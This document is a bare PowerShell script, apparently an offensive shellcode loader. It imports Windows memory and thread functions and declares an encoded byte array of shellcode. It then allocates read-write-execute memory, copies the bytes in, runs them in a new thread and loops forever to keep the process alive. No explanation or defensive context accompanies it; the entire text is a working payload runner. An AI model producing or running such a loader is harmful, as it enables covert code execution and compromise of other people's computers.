$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc7,0xba,0x68,0x04,0x80,0xa3,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0x7c,0xe6,0x75,0x5f,0x94,0x64,0x75,0xa0,0x64,0x09,0xff,0x45,0x55,0x09,0x9b,0x0e,0xc5,0xb9,0xef,0x43,0xe9,0x32,0xbd,0x77,0x7a,0x36,0x6a,0x77,0xcb,0xfd,0x4c,0xb6,0xcc,0xae,0xad,0xd9,0x4e,0xad,0xe1,0x39,0x6f,0x7e,0xf4,0x38,0xa8,0x63,0xf5,0x69,0x61,0xef,0xa8,0x9d,0x06,0xa5,0x70,0x15,0x54,0x2b,0xf1,0xca,0x2c,0x4a,0xd0,0x5c,0x27,0x15,0xf2,0x5f,0xe4,0x2d,0xbb,0x47,0xe9,0x08,0x75,0xf3,0xd9,0xe7,0x84,0xd5,0x10,0x07,0x2a,0x18,0x9d,0xfa,0x32,0x5c,0x19,0xe5,0x40,0x94,0x5a,0x98,0x52,0x63,0x21,0x46,0xd6,0x70,0x81,0x0d,0x40,0x5d,0x30,0xc1,0x17,0x16,0x3e,0xae,0x5c,0x70,0x22,0x31,0xb0,0x0a,0x5e,0xba,0x37,0xdd,0xd7,0xf8,0x13,0xf9,0xbc,0x5b,0x3d,0x58,0x18,0x0d,0x42,0xba,0xc3,0xf2,0xe6,0xb0,0xe9,0xe7,0x9a,0x9a,0x65,0xcb,0x96,0x24,0x75,0x43,0xa0,0x57,0x47,0xcc,0x1a,0xf0,0xeb,0x85,0x84,0x07,0x0c,0xbc,0x71,0x97,0xf3,0x3f,0x82,0xb1,0x37,0x6b,0xd2,0xa9,0x9e,0x14,0xb9,0x29,0x1f,0xc1,0x54,0x2f,0xb7,0x2a,0x00,0x2e,0x23,0xc3,0x53,0x31,0x88,0xf4,0xdd,0xd7,0x9e,0xaa,0x8d,0x47,0x5e,0x1b,0x6e,0x38,0x36,0x71,0x61,0x67,0x26,0x7a,0xab,0x00,0xcc,0x95,0x02,0x78,0x78,0x0f,0x0f,0xf2,0x19,0xd0,0x85,0x7e,0x19,0x5a,0x2a,0x7e,0xd7,0xab,0x47,0x6c,0x8f,0x5b,0x12,0xce,0x19,0x63,0x88,0x65,0xa5,0xf1,0x37,0x2c,0xf2,0x6d,0x3a,0x09,0x34,0x32,0xc5,0x7c,0x4f,0xfb,0x53,0x3f,0x27,0x04,0xb4,0xbf,0xb7,0x52,0xde,0xbf,0xdf,0x02,0xba,0x93,0xfa,0x4c,0x17,0x80,0x57,0xd9,0x98,0xf1,0x04,0x4a,0xf1,0xff,0x73,0xbc,0x5e,0xff,0x56,0x3c,0xa2,0xd6,0x9e,0x4a,0xca,0xea;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};